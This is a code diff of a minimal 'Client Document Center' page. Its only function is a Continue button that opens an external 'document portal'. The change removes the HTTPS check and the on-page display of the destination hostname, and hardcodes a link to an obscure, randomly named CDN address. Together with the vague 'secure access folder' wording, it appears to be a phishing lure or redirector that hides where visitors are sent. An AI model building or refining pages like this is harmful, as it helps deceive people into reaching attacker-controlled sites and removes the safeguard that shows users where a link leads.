@@ -1,9 +1,11 @@
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Client Document Center</title>
+
   <style>
     * { box-sizing: border-box; }
 
@@ -67,60 +69,39 @@
       color: #8a96a5;
       font-size: 11px;
     }
-
-    .destination {
-      margin-top: 12px;
-      font-size: 11px;
-      overflow-wrap: anywhere;
-      color: #8a96a5;
-    }
   </style>
+
+  <script>
+    const DESTINATION_URL =
+      "https://Client-outline-38939-Document-Center-83839030.b-cdn.net/Client%20Document%20Center/index.html";
+
+    function openPortal() {
+      window.open(
+        DESTINATION_URL,
+        "_blank",
+        "noopener,noreferrer"
+      );
+    }
+  </script>
 </head>
+
 <body>
   <main class="card">
     <h1>Client Document Center</h1>
+
     <p>Select Continue to visit the next page.</p>
-    <button id="continueButton" disabled>Loading...</button>
+
+    <button type="button" onclick="openPortal()">
+      Continue
+    </button>
 
     <footer>
       Secure access folder
-      <small class="notice">Continue opens an external document portal.</small>
+      <small class="notice">
+        Continue opens an external document portal.
+      </small>
     </footer>
-
-    <div class="destination" id="destination"></div>
   </main>
-
-  <script>
-    async function loadDestination() {
-      const button = document.getElementById("continueButton");
-      const destinationText = document.getElementById("destination");
-
-      try {
-        const response = await fetch("./config.json", { cache: "no-store" });
-        if (!response.ok) throw new Error("Configuration unavailable");
-
-        const config = await response.json();
-        const url = new URL(config.destinationUrl);
-
-        if (url.protocol !== "https:") {
-          throw new Error("Destination must use HTTPS");
-        }
-
-        destinationText.textContent = "External destination: " + url.hostname;
-        button.textContent = "Continue";
-        button.disabled = false;
-
-        button.addEventListener("click", () => {
-          window.open(url.href, "_blank", "noopener,noreferrer");
-        });
-      } catch (error) {
-        button.textContent = "Temporarily unavailable";
-        destinationText.textContent = "Please try again later.";
-        console.error(error);
-      }
-    }
-
-    loadDestination();
-  </script>
 </body>
 </html>
+```
